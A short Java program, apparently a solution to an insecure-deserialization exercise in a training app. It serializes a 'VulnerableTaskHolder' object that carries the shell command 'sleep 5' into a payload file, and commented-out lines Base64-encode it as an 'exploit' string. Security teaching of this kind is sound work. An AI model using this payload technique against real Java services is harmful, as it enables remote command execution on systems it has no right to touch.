

import org.dummy.insecure.framework.VulnerableTaskHolder;

import java.io.ByteArrayOutputStream;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.util.Base64;

public class Main {
    public static void main(String[] args) {
        try {
            VulnerableTaskHolder go = new VulnerableTaskHolder("dummy", "sleep 5");
            FileOutputStream fos = new FileOutputStream("serial");
            ObjectOutputStream os = new ObjectOutputStream(fos);
            os.writeObject(go);
            os.close();
//            ByteArrayOutputStream bos = new ByteArrayOutputStream();
//            ObjectOutputStream oos = new ObjectOutputStream(bos);
//            oos.writeObject(go);
//            oos.flush();
//            byte[] exploit = bos.toByteArray();
//            String exp = Base64.getEncoder().encodeToString(exploit);
//            System.out.println(exp);

        }catch (Exception e) {
            System.out.println("sth is wrong....");
        }
    }
}
